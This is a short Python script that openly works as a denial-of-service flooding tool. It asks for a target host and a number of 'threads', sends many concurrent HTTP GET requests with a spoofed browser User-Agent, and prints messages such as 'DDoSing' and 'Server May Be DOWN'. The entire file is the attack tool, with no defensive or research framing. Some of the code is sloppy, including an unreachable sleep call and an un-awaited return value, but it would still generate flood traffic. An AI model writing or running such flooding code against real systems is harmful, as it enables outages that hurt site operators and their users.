

import asyncio
import aiohttp
import os
import time
import colorama
from colorama import Fore
from colorama import Style

colorama.init()

os.system('cls')

print("")
host = input("Host Target : ")

time.sleep(1)

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"}

async def attacking(session, headers):
    async with session.get(host, headers=headers) as request:
        if request.status == 200:
            print(Fore.BLUE + Style.BRIGHT + (" DDoSing.............."))
        else:
            print(Fore.YELLOW + Style.BRIGHT + ("Server May Be DOWN...."))

        return request.text()
        time.sleep(0.00)

async def main():
    attack_num = int(input("Threads : "))

    threads = []
    async with aiohttp.ClientSession() as session:
        for i in range(attack_num):
            t = asyncio.ensure_future(attacking(session, headers))
            threads.append(t)

        await asyncio.gather(*threads * attack_num)

if __name__ == '__main__':
    loopenda = asyncio.get_event_loop()
    loopenda.run_until_complete(main())

print(Fore.RED + Style.BRIGHT + " KILLED.........")
